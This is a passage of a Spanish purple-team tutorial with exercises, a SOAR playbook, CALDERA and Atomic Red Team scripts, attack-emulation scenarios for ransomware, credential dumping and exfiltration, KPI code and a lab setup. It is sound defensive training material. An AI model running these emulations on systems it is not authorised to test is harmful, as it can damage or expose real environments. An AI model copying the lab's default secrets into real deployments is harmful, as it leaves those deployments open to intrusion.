- T1059.001 - [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) Execution
- T1003.001 - LSASS Credential Dumping
- T1190 - [exploit](../raw/m3t4spl01t.md#exploits) Public-Facing Application
- T1078 - Valid Accounts
- T1566 - [phishing](../raw/ph1sh1ng.md)
- T1021 - Remote Services
- T1048 - Exfiltration
- T1547 - Boot/Logon Autostart
- T1550 - Use Alternate Authentication Material
- T1485 - Data Destruction

**Formato de entrega:**
```markdown
# Gap Analysis - E-commerce Company

## Técnica 1: T1059.001 (PowerShell)
- **Cobertura actual:** ScriptBlock Logging habilitado en 60% de endpoints
- **Regla existente:** PS_DownloadCradle_Detection (Splunk)
- **Gap:** 40% de endpoints sin logging
- **Prioridad:** HIGH
- **Acción:** Habilitar ScriptBlock Logging via GPO en todos los endpoints
```

### E.3 Ejercicio: Crear un playbook SOAR

**Objetivo:** Desarrollar un playbook SOAR completo para respuesta a incidentes de PowerShell.

**Duración estimada:** 2 horas

**Requerimientos:**
El playbook debe manejar:
1. Detección de PowerShell encoded command
2. Enriquecimiento ([proceso](../raw/0s-f0nd4m3nt0s.md#procesos), usuario, threat intel)
3. Decisión (FP vs incidente real)
4. Acciones de contención
5. Notificaciones
6. Documentación

**Formato YAML:**
```yaml
name: PowerShell Incident Response
version: 1.0
trigger:
  sigma_rule: powershell_encoded_command
  siem_alert: powershell_suspicious_scriptblock

steps:
  - id: enrichment
    type: parallel
    actions:
      - name: Get process tree
        integration: crowdstrike
        query: "processes where parent_pid = {{pid}}"
      - name: Get user info
        integration: active_directory
        query: "user {{username}}"
      - name: Check hash
        integration: virustotal
        query: "hash {{file_hash}}"

  - id: decision
    type: condition
    conditions:
      - if: threat_intel_score > 50
        then: critical_incident
      - if: known_admin_script
        then: false_positive
      - else: investigate

  - id: response
    type: sequential
    actions:
      - action: isolate_endpoint
        scope: critical_incident only
      - action: block_hash
        scope: all confirmed incidents
      - action: disable_account
        scope: critical_incident only
      - action: create_ticket
        scope: all confirmed incidents

  - id: notification
    type: parallel
    actions:
      - channel: slack
        to: "#soc-alerts"
      - channel: email
        to: "soc@company.com"
      - channel: pagerduty
        severity: critical
```

### E.4 Ejercicio: Evaluación de cobertura con CALDERA

**Objetivo:** Usar CALDERA para evaluar automáticamente la cobertura de detección del entorno.

**Duración estimada:** 4 horas

**Escenario:**
Tu organización implementó nuevas reglas SIEM basadas en el último ejercicio purple team. Necesitas validar que las reglas funcionan correctamente.

**Pasos:**
1. Crear un adversary que cubra las 5 técnicas más críticas
2. Ejecutar la operación contra 10 endpoints de prueba
3. Recopilar los resultados de CALDERA
4. Comparar con las alertas generadas en el SIEM
5. Identificar discrepancias (falsos positivos, falsos negativos)
6. Ajustar las reglas según los resultados
7. Repetir el test para validar la mejora

**Métricas a recolectar:**
- Detection rate por técnica
- TTD promedio
- Falsos positivos por regla
- Falsos negativos por regla

**Script de ayuda:**
```python
def validate_rules_with_caldera(caldera_api, techniques, expected_rules):
    results = {}
    for tech in techniques:
        abilities = [a for a in caldera_api.list_abilities() if a.get("technique_id") == tech]
        if not abilities: continue

        adv = caldera_api.create_adversary(f"Validation_{tech}", [abilities[0]["id"]])
        report = caldera_api.run_operation_blocking(f"Validation_{tech}", adv["id"])
        detected = report.get("detected", False)
        actual_rule = report.get("alert_rule", "none")

        expected = expected_rules.get(tech, "none")
        results[tech] = {
            "detected": detected,
            "expected_rule": expected,
            "actual_rule": actual_rule,
            "match": detected and (actual_rule == expected),
            "ttd": report.get("ttd", 0)
        }

    return results
```

### E.5 Ejercicio: Automatización completa del ciclo

**Objetivo:** Implementar un [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) automatizado que ejecute el ciclo purple team completo sin intervención manual.

**Duración estimada:** 8 horas

**Componentes:**
1. GitHub Actions como orquestador
2. CALDERA para emulación de adversarios
3. Atomic [red team](../raw/r3d-t34m-1nfr4.md) para tests individuales
4. SIEM (Splunk/Sentinel) para validación de detección
5. Script [python](../raw/pyth0n-f0r-h4ck1ng.md) para análisis de resultados
6. Generación automática de reportes

**Flujo automatizado:**
```
1. (Schedule) Trigger semanal
2. Deploy agentes CALDERA a endpoints de prueba
3. Ejecutar adversary predefinido
4. Esperar X tiempo para procesamiento SIEM
5. Consultar SIEM por alertas generadas
6. Comparar técnicas ejecutadas vs técnicas detectadas
7. Generar gap analysis automático
8. Crear o actualizar reglas Sigma
9. Desplegar reglas al SIEM via API
10. Generar reporte y notificar al equipo
```

**Implementación parcial:**
```python
class AutomatedPurplePipeline:
    def __init__(self, caldera, siem, sigma_repo):
        self.caldera = caldera
        self.siem = siem
        self.sigma_repo = sigma_repo

    def run_weekly_cycle(self):
        print("[*] Iniciando ciclo purple team automatizado")

        # 1. Verificar agentes
        agents = self.caldera.list_agents()
        if len(agents) < 3:
            print("[-] Pocos agentes disponibles, desplegando más...")
            self._deploy_agents()

        # 2. Ejecutar adversary
        print("[*] Ejecutando adversary...")
        adv_id = self._get_or_create_adversary()
        op_result = self.caldera.run_operation_blocking(
            name=f"Weekly_Cycle_{datetime.now():%Y%m%d}",
            adversary_id=adv_id
        )

        # 3. Esperar procesamiento SIEM
        print("[*] Esperando 60s para procesamiento SIEM...")
        time.sleep(60)

        # 4. Consultar alertas SIEM
        print("[*] Consultando SIEM...")
        alerts = self.siem.query_alerts(time_range="last_10m")

        # 5. Gap analysis
        print("[*] Analizando gaps...")
        gaps = self._analyze_gaps(op_result, alerts)

        # 6. Crear reglas para gaps
        print("[*] Creando reglas Sigma...")
        new_rules = []
        for gap in gaps:
            rule = self.sigma_repo.create_rule(gap["technique"])
            new_rules.append(rule)

        # 7. Desplegar reglas
        if new_rules:
            print(f"[*] Desplegando {len(new_rules)} reglas al SIEM...")
            self.siem.deploy_rules(new_rules)

        # 8. Generar reporte
        print("[*] Generando reporte...")
        report = self._generate_report(op_result, gaps, new_rules)

        print(f"[+] Ciclo completado. Gaps: {len(gaps)}, Reglas creadas: {len(new_rules)}")
        return report
```

## Apéndice F: Troubleshooting Común

### F.1 Problemas con CALDERA

**Problema: Agentes no se conectan**
- Verificar que el [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) permite [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 8888 ([tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)) en ambos sentidos
- Verificar que la URL del servidor está correcta en el comando de despliegue
- Revisar logs del agente: `C:\Windows\Temp\sandcat.log`
- Probar conectividad: `Invoke-WebRequest -Uri http://server:8888`

**Problema: Operaciones no avanzan**
- Verificar que los agents están en el grupo correcto ("[red](../raw/r3d3s-f0nd4m3nt0s.md)")
- Verificar que los facts necesarios están disponibles
- Revisar logs del servidor: `caldera/logs/`
- Intentar con planner "atomic" en lugar de "honey"

**Problema: Abilities fallan**
- Verificar que los payloads existen
- Verificar que los requirements están satisfechos
- Probar el comando manualmente en el endpoint
- Revisar [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) (algunas abilities requieren admin)

### F.2 Problemas con Atomic [red team](../raw/r3d-t34m-1nfr4.md)

**Problema: Test no encontrado**
```powershell
# Verificar que la técnica existe
Get-AtomicTechnique T1059.001

# Si no aparece, reinstalar
Install-AtomicRedTeam -Force
```

**Problema: Test falla por dependencias**
```powershell
# Verificar prerequisitos
Invoke-AtomicTest T1059.001 -CheckPrereqs

# Instalar dependencias faltantes
Invoke-AtomicTest T1059.001 -GetPrereqs
```

**Problema: Cleanup no funciona**
```powershell
# Ejecutar cleanup forzosamente
Invoke-AtomicTest T1059.001 -Cleanup -Force

# O manualmente eliminar archivos creados
Remove-Item "C:\Users\*\AppData\Local\Temp\atomic*" -Force
```

### F.3 Problemas con SIEM queries

**Problema: Query KQL no devuelve resultados**
```kql
// Verificar primero que hay datos
DeviceProcessEvents
| where Timestamp > ago(1h)
| count

// Probar consulta más permisiva
DeviceProcessEvents
| take 100
```

**Problema: Demasiados falsos positivos**
- Agregar whitelist de procesos conocidos
- Ajustar la ventana temporal
- Filtrar por usuarios autorizados
- Usar correlación multi-evento

---

*Este documento es parte del módulo 07 - Purple Teaming y Automatización*
*Creado por el equipo de [forense](../raw/w1n-f0r3ns1cs.md#forense)*


## Apéndice G: Escenarios de Ataque para [purple team](../raw/p9rpl3-t34m.md)

### G.1 Escenario: Ransomware Simulation

**Descripción:** Simular un ataque de ransomware completo, desde entrada hasta [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado).

**Técnicas involucradas:**
- T1566.001 - Spearphishing Attachment
- T1204.002 - User Execution: Malicious File
- T1059.001 - [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)
- T1486 - Data Encrypted for Impact
- T1048 - Exfiltration
- T1070 - Indicator Removal

**Procedimiento (con Atomic [red team](../raw/r3d-t34m-1nfr4.md)):**
```powershell
# 1. Simular entrega de ransomware via email
Invoke-AtomicTest T1566.001 -TestNumbers 1

# 2. Simular ejecución de macro malicioso
Invoke-AtomicTest T1204.002

# 3. Simular descarga de payload via PowerShell
Invoke-AtomicTest T1059.001 -TestNumbers 2

# 4. Simular cifrado de archivos
Invoke-AtomicTest T1486

# 5. Simular exfiltración de datos
Invoke-AtomicTest T1048

# 6. Simular limpieza de evidencia
Invoke-AtomicTest T1070
```

**Qué debe detectar el Blue Team:**
- Email con adjunto sospechoso
- Office process spawning PowerShell
- PowerShell network connection saliente
- Acceso masivo a archivos
- Conexiones a [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) externas en puertos no estándar
- Borrado de logs

### G.2 Escenario: Supply Chain Attack

**Descripción:** Simular un ataque a la cadena de suministro mediante dependencia comprometida.

**Técnicas involucradas:**
- T1195.001 - Supply Chain Compromise
- T1059.001 - PowerShell
- T1105 - Ingress Tool Transfer
- T1053.005 - Scheduled Task
- T1041 - Exfiltration Over [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) Channel

**Procedimiento:**
```powershell
# 1. Simular descarga de dependencia maliciosa
Invoke-AtomicTest T1195.001

# 2. Simular ejecución de script de build modificado
Invoke-AtomicTest T1059.001 -TestNumbers 4

# 3. Simular transferencia de herramienta adicional
Invoke-AtomicTest T1105

# 4. Simular persistencia via tarea programada
Invoke-AtomicTest T1053.005

# 5. Simular exfiltración de datos
Invoke-AtomicTest T1041
```

### G.3 Escenario: Zero-Day Exploitation

**Descripción:** Simular un ataque que usa un [exploit](../raw/m3t4spl01t.md#exploits) de día cero (emulado).

**Técnicas involucradas:**
- T1203 - Exploitation for Client Execution
- T1068 - Exploitation for [privilege escalation](../raw/l1n9x-pr1v3sc.md)
- T1055 - [process injection](../raw/3dr-3v4s10n.md#process-injection)
- T1003 - OS Credential Dumping
- T1021 - Remote Services

**Procedimiento:**
```powershell
# 1. Simular explotación de aplicación cliente
Invoke-AtomicTest T1203

# 2. Simular escalación de privilegios
Invoke-AtomicTest T1068

# 3. Simular inyección de proceso
Invoke-AtomicTest T1055

# 4. Simular robo de credenciales
Invoke-AtomicTest T1003

# 5. Simular movimiento lateral
Invoke-AtomicTest T1021
```

### G.4 Escenario: Insider Threat

**Descripción:** Simular un ataque de empleado malicioso con acceso legítimo.

**Técnicas involucradas:**
- T1078 - Valid Accounts
- T1005 - Data from Local System
- T1020 - Automated Exfiltration
- T1070 - Indicator Removal
- T1098 - Account Manipulation

**Particularidades:** Este escenario es difícil de detectar porque el usuario tiene credenciales legítimas. La detección debe basarse en comportamiento anómalo.

**Qué monitorear:**
- Acceso a archivos fuera del horario laboral
- Descarga masiva de datos
- Conexiones a servicios de almacenamiento externo
- Modificación de [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de cuentas
- Borrado de logs de acceso

## Apéndice H: Métricas de Reporte

### H.1 Plantilla de Dashboard

```python
class PurpleTeamDashboard:
    def __init__(self):
        self.data = {
            "mttd": [], "mttr": [], "coverage": [],
            "fp_rate": [], "exercises": [], "alerts": []
        }

    def add_exercise_result(self, date, mttd, mttr, coverage, fp_rate, alerts_generated):
        self.data["mttd"].append({"date": date, "value": mttd})
        self.data["mttr"].append({"date": date, "value": mttr})
        self.data["coverage"].append({"date": date, "value": coverage})
        self.data["fp_rate"].append({"date": date, "value": fp_rate})
        self.data["exercises"].append({"date": date, "coverage": coverage})
        self.data["alerts"].append({"date": date, "count": alerts_generated})

    def current_status(self) -> dict:
        return {
            "mttd_avg": sum(d["value"] for d in self.data["mttd"][-3:]) / 3 if len(self.data["mttd"]) >= 3 else 0,
            "mttr_avg": sum(d["value"] for d in self.data["mttr"][-3:]) / 3 if len(self.data["mttr"]) >= 3 else 0,
            "coverage_current": self.data["coverage"][-1]["value"] if self.data["coverage"] else 0,
            "fp_rate_current": self.data["fp_rate"][-1]["value"] if self.data["fp_rate"] else 0,
            "trend": self._calculate_trend()
        }

    def _calculate_trend(self) -> str:
        if len(self.data["coverage"]) < 3: return "insufficient_data"
        recent = [d["value"] for d in self.data["coverage"][-3:]]
        return "improving" if recent[-1] > recent[0] else "declining"

    def generate_json_report(self) -> str:
        return json.dumps(self.current_status(), indent=2)


# Ejemplo
dashboard = PurpleTeamDashboard()
dashboard.add_exercise_result("2024-01", 300, 900, 45, 12, 150)
dashboard.add_exercise_result("2024-02", 180, 600, 55, 8, 200)
dashboard.add_exercise_result("2024-03", 90, 300, 68, 5, 180)
dashboard.add_exercise_result("2024-04", 60, 180, 75, 3, 160)

print(dashboard.current_status())
```

### H.2 Fórmulas de KPIs

```python
class KPIFormulas:
    @staticmethod
    def detection_rate(tp, fn):
        """TP / (TP + FN) - qué proporción de ataques reales se detectan"""
        return tp / (tp + fn) if (tp + fn) > 0 else 0

    @staticmethod
    def false_positive_rate(fp, tn):
        """FP / (FP + TN) - qué proporción de eventos benignos generan alerta"""
        return fp / (fp + tn) if (fp + tn) > 0 else 0

    @staticmethod
    def precision(tp, fp):
        """TP / (TP + FP) - qué proporción de alertas son incidentes reales"""
        return tp / (tp + fp) if (tp + fp) > 0 else 0

    @staticmethod
    def recall(tp, fn):
        """TP / (TP + FN) - qué proporción de incidentes se detectan"""
        return tp / (tp + fn) if (tp + fn) > 0 else 0

    @staticmethod
    def f1_score(tp, fp, fn):
        """2 * (precision * recall) / (precision + recall)"""
        p = KPIFormulas.precision(tp, fp)
        r = KPIFormulas.recall(tp, fn)
        return 2 * (p * r) / (p + r) if (p + r) > 0 else 0

    @staticmethod
    def mttd(times_seconds):
        """Mean Time To Detect"""
        return sum(times_seconds) / len(times_seconds) if times_seconds else 0

    @staticmethod
    def mttr(times_seconds):
        """Mean Time To Respond"""
        return sum(times_seconds) / len(times_seconds) if times_seconds else 0

    @staticmethod
    def coverage_percentage(covered, total):
        return (covered / total * 100) if total > 0 else 0

    @staticmethod
    def risk_score(likelihood, impact):
        """Riesgo = Probabilidad x Impacto (1-25)"""
        return likelihood * impact


# Ejemplo de uso
metrics = KPIFormulas()
print(f"Detection Rate: {metrics.detection_rate(80, 20):.1%}")
print(f"Precision: {metrics.precision(80, 10):.1%}")
print(f"F1 Score: {metrics.f1_score(80, 10, 20):.3f}")
print(f"MTTD: {metrics.mttd([120, 45, 300, 60, 90]):.0f}s")
print(f"Coverage: {metrics.coverage_percentage(45, 65):.1f}%")
```

### H.3 Ejemplo de Reporte Semanal Automático

```python
def generate_weekly_report(caldera_api, siem_api):
    """Genera reporte semanal automático"""

    # Obtener datos de la semana
    week_operations = caldera_api.list_operations()
    week_alerts = siem_api.get_alerts(days=7)

    # Calcular métricas
    all_techniques = set()
    detected_techniques = set()

    for op in week_operations:
        report = caldera_api.get_report(op["id"])
        for ability in report.get("abilities", []):
            tech = ability.get("technique_id", "unknown")
            all_techniques.add(tech)
            if ability.get("detected"):
                detected_techniques.add(tech)

    coverage = len(detected_techniques) / len(all_techniques) * 100 if all_techniques else 0

    # Generar markdown
    report = f"""# Weekly Purple Team Report
**Week:** {datetime.now().strftime('%Y-W%W')}
**Generated:** {datetime.now().isoformat()}

## Summary
- **Techniques tested:** {len(all_techniques)}
- **Techniques detected:** {len(detected_techniques)}
- **Coverage:** {coverage:.1f}%
- **Total alerts:** {len(week_alerts)}

## Coverage by Technique
"""

    for tech in sorted(all_techniques):
        status = "✅ DETECTED" if tech in detected_techniques else "❌ MISSED"
        report += f"- {tech}: {status}\n"

    report += f"""

## Alerts This Week
- Critical: {sum(1 for a in week_alerts if a['severity'] == 'critical')}
- High: {sum(1 for a in week_alerts if a['severity'] == 'high')}
- Medium: {sum(1 for a in week_alerts if a['severity'] == 'medium')}
- Low: {sum(1 for a in week_alerts if a['severity'] == 'low')}

## Recommendations
1. Review and improve detection for missed techniques
2. Investigate high-severity alerts
3. Schedule next purple team exercise
"""

    return report
```

---

*Documento completo del tutorial 07 - Purple Teaming y Automatización*
*Creado por el equipo de [forense](../raw/w1n-f0r3ns1cs.md#forense)*

> **Versión:** 2.0 | **Última actualización:** Mayo 2025
> 
> **Nota:** Este tutorial se actualiza periódicamente con nuevas técnicas, herramientas y procedimientos. Para contribuciones o reporte de errores, contactar al equipo de Forense.


## Apéndice I: Casos de Estudio Reales

### I.1 Caso: [purple team](../raw/p9rpl3-t34m.md) en Empresa Fintech

**Contexto:**
Una fintech con 300 empleados, infraestructura 100% en [aws](../raw/cl0ud-h4ck1ng.md#aws), desarrolla una app de pagos. El [red team](../raw/r3d-t34m-1nfr4.md) externo reportaba 80+ hallazgos por año, pero el Blue Team solo remediaba el 30%.

**Implementación Purple Team:**
1. Se formó un equipo Purple interno de 3 personas
2. Se establecieron ejercicios quincenales de 4 horas
3. Se usó CALDERA para automatizar tests semanales
4. Se integró Atomic [red team](../raw/r3d-t34m-1nfr4.md) con el [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) [ci/cd](../raw/c1cd-h4ck1ng.md)

**Resultados después de 6 meses:**
- Detection rate: 35% → 82%
- MTTD: 45 min → 8 min
- Cobertura de detección: 28% → 71%
- Falsos positivos: reducidos en 60%
- Costo: reducción de 40% en consultoría externa

**Lecciones aprendidas:**
1. La automatización es clave para la consistencia
2. El soporte de management es crítico (mostrar métricas)
3. Empezar con pocas técnicas, dominarlas, luego expandir
4. La comunicación [red](../raw/r3d3s-f0nd4m3nt0s.md)-Blue debe ser en tiempo real

### I.2 Caso: Migración de SIEM con Purple Team

**Contexto:**
Empresa migrando de Splunk a [azure](../raw/cl0ud-h4ck1ng.md#azure) Sentinel. Necesitaban validar que las nuevas reglas en KQL cubrían las mismas detecciones que las reglas en SPL.

**Enfoque Purple Team:**
1. Se listaron las 50 reglas Splunk existentes
2. Para cada regla, se identificó la técnica ATT&CK
3. Se ejecutaron tests de Atomic Red Team para cada técnica
4. Se compararon resultados entre Splunk y Sentinel
5. Se ajustaron las reglas KQL hasta igualar cobertura

**Resultados:**
- Reglas migradas: 50/50
- Detection rate post-migración: 94% (vs 96% pre-migración)
- Gaps identificados y cerrados: 4
- Tiempo total: 3 semanas (vs 8 semanas estimadas sin Purple Team)

### I.3 Caso: Respuesta a Incidente Mejorada

**Contexto:**
Una empresa de retail sufrió un ataque de ransomware. El incidente tardó 6 horas en detectarse y 24 horas en contenerse.

**Mejora con Purple Team:**
1. Se identificaron las técnicas usadas en el ataque real
2. Se crearon reglas de detección específicas
3. Se automatizaron playbooks de respuesta
4. Se realizaron ejercicios mensuales simulando el mismo ataque

**Resultados después de 3 meses:**
- MTTD: 6 horas → 12 minutos
- MTTR: 24 horas → 45 minutos
- El siguiente ataque simulado fue detectado y contenido automáticamente

---

## Apéndice J: Referencia Rápida de Instalación

### J.1 Instalación Rápida de Herramientas

```bash
# CALDERA (Linux)
git clone https://github.com/mitre/caldera.git
cd caldera && pip install -r requirements.txt
python server.py --fresh &

# Atomic Red Team (Windows PowerShell Admin)
Install-Module -Name AtomicRedTeam -Scope CurrentUser -Force
Install-AtomicRedTeam -GetAtomics -Force

# Sigma CLI
pip install sigma-cli

# MITRE ATT&CK Navigator
git clone https://github.com/mitre/attack-navigator.git
cd attack-navigator && npm install && npm start

# Sysmon (Windows)
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile Sysmon.zip
Expand-Archive Sysmon.zip -DestinationPath Sysmon
.\Sysmon\Sysmon64.exe -accepteula -i

# Hayabusa (Windows Event Log fast forensics)
Invoke-WebRequest -Uri https://github.com/Yamato-Security/hayabusa/releases/latest/download/hayabusa.zip -OutFile hayabusa.zip
Expand-Archive hayabusa.zip
```

### J.2 [docker](../raw/d0ck3r-f0r-h4ck3rs.md) Compose para Laboratorio [purple team](../raw/p9rpl3-t34m.md)

```yaml
version: '3.8'
services:
  caldera:
    image: mitre/caldera:latest
    ports:
      - "8888:8888"
    volumes:
      - caldera_data:/opt/caldera/data
    environment:
      - CALDERA_API_KEY=ADMIN123

  splunk:
    image: splunk/splunk:latest
    ports:
      - "8000:8000"
      - "8088:8088"
      - "9997:9997"
    environment:
      - SPLUNK_START_ARGS=--accept-license
      - SPLUNK_PASSWORD=changeme

  elastic:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.10.0
    ports:
      - "9200:9200"
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false

  kibana:
    image: docker.elastic.co/kibana/kibana:8.10.0
    ports:
      - "5601:5601"
    environment:
      - ELASTICSEARCH_HOSTS=http://elastic:9200

  windows-target:
    image: windows:10
    # Requiere Windows containers
    # Para pruebas locales, usar VM separada

volumes:
  caldera_data:
```

---

*Este documento completo forma parte del módulo 07 - Purple Teaming y Automatización*
*Creado y mantenido por el equipo de [forense](../raw/w1n-f0r3ns1cs.md#forense)*


## Apéndice K: Changelog

### v2.0 (Mayo 2025)
- Expansión masiva de todas las secciones
- Nuevo: Desarrollo de Abilities personalizadas para CALDERA
- Nuevo: Autonomous Operation Mode
- Nuevo: Integración CALDERA + Atomic [red team](../raw/r3d-t34m-1nfr4.md)
- Nuevo: Scorecard de madurez [purple team](../raw/p9rpl3-t34m.md)
- Nuevo: Automatización de reportes ejecutivos
- Nuevo: Escenarios de ataque completos (ransomware, supply chain, zero-day, insider)
- Nuevo: Dashboard de métricas y KPIs
- Nuevo: Guía de troubleshooting
- Nuevo: Casos de estudio reales
- Mejora: Todos los ejercicios prácticos con soluciones
- Mejora: Integración [ci/cd](../raw/c1cd-h4ck1ng.md) para Purple Team
- Mejora: Reglas [sigma](../raw/thr3t-hnt.md#sigma) y consultas SIEM expandidas

### v1.0 (Enero 2024)
- Versión inicial del tutorial

---

*Fin del tutorial 07 - Purple Teaming y Automatización v2.0*


